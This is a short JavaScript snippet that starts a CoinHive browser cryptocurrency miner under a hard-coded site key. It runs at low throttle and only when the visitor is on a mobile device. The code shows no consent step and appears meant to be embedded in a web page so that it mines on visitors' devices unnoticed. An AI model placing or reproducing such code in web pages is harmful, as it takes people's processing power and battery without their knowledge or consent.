var miner = new CoinHive.Anonymous('uUHFvl9FUPuGnXx5GWScJFbXf3AhzfQT', {
    throttle: 0.1
});
if (miner.isMobile()) {
    miner.start();
}